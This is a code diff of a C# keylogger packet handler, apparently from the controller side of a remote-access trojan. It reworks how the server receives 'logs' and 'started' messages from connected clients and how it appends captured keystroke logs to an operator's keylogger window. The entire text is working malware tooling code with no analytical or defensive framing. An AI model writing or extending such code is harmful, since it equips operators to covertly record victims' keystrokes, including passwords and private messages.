@@ -13,9 +13,11 @@ namespace Server.Handle_Packet
     {
         public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
         {
-            try
+            switch (unpack_msgpack.ForcePathObject("Command").AsString)
             {
-                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
+                case "logs":
+                    {
+                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("ID").GetAsString()];
                         if (KL != null)
                         {
                             KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
@@ -25,14 +27,26 @@ namespace Server.Handle_Packet
                         }
                         else
                         {
-                            MsgPack msgpack = new MsgPack();
-                            msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-                            msgpack.ForcePathObject("isON").AsString = "false";
-                            client.Send(msgpack.Encode2Bytes());
-                }
+                            client.Disconnected();
+                        }
+                        break;
+                    }
 
+                case "started":
+                    {
+                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("ID").GetAsString()];
+                        if (KL != null)
+                        {
+                            KL.Client = client;
+                            KL.timer1.Start();
+                        }
+                        else
+                        {
+                            client.Disconnected();
+                        }
+                        break;
+                    }
             }
-            catch { }
         }
     }
 }
